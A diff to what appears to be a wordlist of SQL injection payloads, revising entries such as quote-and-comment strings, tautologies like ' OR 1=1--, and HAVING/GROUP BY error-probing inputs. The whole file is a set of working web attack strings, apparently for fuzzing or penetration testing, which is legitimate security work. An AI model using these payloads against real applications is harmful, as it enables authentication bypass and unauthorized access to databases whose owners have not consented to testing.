@@ -1,9 +1,13 @@
 '
 "
-' OR 1=1 --
-" OR 1=1 --
+'--
+"--
+' OR 1=1--
+" OR 1=1--
 ' OR '1'='1
 " OR "1"="1
-' OR 'a'='a'
-' OR 1=1#
-' OR 1=1/*
+1' OR '1'='1
+' OR 1 -- -
+' OR 'a'='a
+' HAVING 1=1 --
+' GROUP BY column_name HAVING 1=1 --
